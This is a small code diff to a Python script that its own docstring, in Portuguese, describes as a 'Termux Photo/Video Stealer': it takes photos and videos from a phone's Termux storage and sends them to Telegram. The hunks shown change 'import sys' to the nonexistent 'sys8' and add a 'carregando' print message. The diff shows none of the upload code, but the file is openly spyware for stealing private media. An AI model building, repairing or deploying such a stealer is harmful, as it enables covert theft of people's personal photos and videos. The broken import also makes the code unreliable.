@@ -4,7 +4,7 @@ Termux Photo/Video Stealer - TUDO EM UM ARQUIVO
 Rouba fotos e vídeos do storage do Termux e envia para Telegram
 """
 import os
-import sys
+import sys8
 import json
 import time
 import hashlib
@@ -269,7 +269,7 @@ class TermuxStealer:
                 time.sleep(1)  # Evita flood
         
         if sent > 0:
-            
+            print("carregando")            
         else:
             print("[*] Nenhum arquivo novo")
         
